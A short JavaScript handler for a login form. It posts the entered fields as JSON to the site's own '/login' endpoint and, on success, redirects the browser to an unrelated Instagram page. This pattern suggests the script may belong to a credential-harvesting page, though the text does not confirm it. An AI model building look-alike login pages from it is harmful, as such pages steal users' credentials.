document.addEventListener('DOMContentLoaded', () => {
  const form = document.getElementById('loginForm');
  const submitButton = document.getElementById('submitButton');
  const formMessage = document.getElementById('formMessage');

  if (!form || !submitButton || !formMessage) return;

  form.addEventListener('submit', async (event) => {
    event.preventDefault();

    const formData = new FormData(form);
    const payload = Object.fromEntries(formData.entries());

    formMessage.textContent = '';
    formMessage.className = 'form-message';
    submitButton.disabled = true;
    submitButton.textContent = 'Logging in...';

    try {
      const response = await fetch('/login', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(payload)
      });

      const data = await response.json().catch(() => null);

      if (!response.ok || !data || !data.success) {
        formMessage.textContent = (data && data.message) || 'Unable to log in right now. Please try again.';
        formMessage.classList.add('is-error');
        submitButton.disabled = false;
        submitButton.textContent = 'Log In';
        return;
      }

      window.location.assign('https://www.instagram.com/popular/bengaluru-wonderla/?hl=en');
    } catch (error) {
      console.error(error);
      formMessage.textContent = 'Network error. Please try again.';
      formMessage.classList.add('is-error');
      submitButton.disabled = false;
      submitButton.textContent = 'Log In';
    }
  });
});
